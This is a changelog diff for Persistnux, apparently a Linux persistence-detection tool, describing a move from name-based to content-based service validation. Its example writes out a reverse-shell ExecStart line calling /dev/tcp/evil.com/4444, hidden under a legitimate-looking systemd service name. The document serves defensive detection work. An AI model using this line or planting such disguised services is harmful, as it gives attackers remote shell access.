@@ -5,6 +5,35 @@ All notable changes to Persistnux will be documented in this file.
 The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.0.0/),
 and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).
 
+## [1.3.0] - 2026-01-23
+
+### Changed
+- **SECURITY IMPROVEMENT**: Replaced name-based service whitelisting with content-based validation
+  - Removed `KNOWN_GOOD_SERVICES` array (service name whitelist)
+  - Added `KNOWN_GOOD_EXECUTABLE_PATHS` array (trusted binary paths)
+  - Added `KNOWN_GOOD_COMMAND_PATTERNS` array (safe command patterns)
+  - Added `NEVER_WHITELIST_PATTERNS` array (always malicious patterns)
+- **New Function**: `is_command_safe()` replaces `is_known_good_service()`
+  - Validates based on what is being executed, not the service name
+  - Prevents attackers from hiding malicious commands in legitimate-sounding service names
+  - Three-tier validation: 1) Check for dangerous patterns, 2) Check for safe paths, 3) Check for safe patterns
+
+### Security Rationale
+**Why This Matters**: Attackers can easily create services named `systemd-update.service` or `dbus-monitor.service` to bypass name-based filtering. Content-based validation ensures that even if the service name looks legitimate, the actual command being executed is analyzed.
+
+**Example Attack Prevented**:
+```systemd
+# Service name: systemd-timesync.service (looks legitimate)
+# ExecStart: /bin/bash -c 'bash -i >& /dev/tcp/evil.com/4444'
+# v1.2: Would be whitelisted by name
+# v1.3: Detected as HIGH confidence (dangerous command pattern)
+```
+
+### Improved
+- More accurate detection: Legitimately named services with malicious commands now detected
+- Fewer false negatives: Mimicked service names no longer bypass detection
+- Better confidence scoring: Safe system binaries automatically get LOW confidence
+
 ## [1.2.0] - 2026-01-23
 
 ### Added
